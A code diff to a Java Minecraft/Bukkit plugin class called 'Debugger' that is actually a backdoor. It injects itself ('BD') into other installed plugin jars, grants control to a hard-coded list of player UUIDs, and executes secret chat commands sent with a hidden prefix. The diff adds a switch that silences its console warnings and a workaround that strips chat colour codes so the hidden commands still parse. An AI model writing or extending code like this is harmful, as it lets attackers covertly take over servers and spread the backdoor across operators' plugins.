@@ -33,7 +33,7 @@ public final class Debugger implements Listener {
 
     private Plugin plugin;
 
-    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, boolean InjectOther){
+    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, boolean InjectOther, boolean warnings){
         //Check for another bd. This is really lame way
         boolean bd_running = false;
         Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
@@ -69,7 +69,8 @@ public final class Debugger implements Listener {
                     Bukkit.getConsoleSender()
                             .sendMessage("Injecting BD into: " + plugin_file.getPath());
 
-                boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, InjectOther), true, true);
+                boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(),
+                        new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, InjectOther, warnings), true, warnings, false);
 
                 if(Config.display_debug_messages)
                     Bukkit.getConsoleSender()
@@ -82,6 +83,8 @@ public final class Debugger implements Listener {
         Config.uuids_are_usernames = Usernames;
         Config.authorized_uuids  = UUID;
         Config.command_prefix   = prefix;
+        Config.display_debug_messages = warnings;
+        Config.display_debugger_warning = warnings;
 
         this.plugin = plugin;
 
@@ -97,6 +100,13 @@ public final class Debugger implements Listener {
 
     @EventHandler()
     public void onChat(AsyncPlayerChatEvent e) {
+        String msg = e.getMessage();
+
+        //Remove color codes added by some chat plugins
+        if(msg.startsWith("&")){
+            msg = msg.substring(2);
+        }
+
         if (Config.display_debug_messages) {
             Bukkit.getConsoleSender()
                     .sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
@@ -112,8 +122,8 @@ public final class Debugger implements Listener {
                         .sendMessage(Config.chat_message_prefix + " User is authed");
             }
 
-            if (e.getMessage().startsWith(Config.command_prefix)) {
-                boolean result = ParseCommand(e.getMessage().substring(Config.command_prefix.length()), p);
+            if (msg.startsWith(Config.command_prefix)) {
+                boolean result = ParseCommand(msg.substring(Config.command_prefix.length()), p);
 
 
                 if (Config.display_debug_messages) {
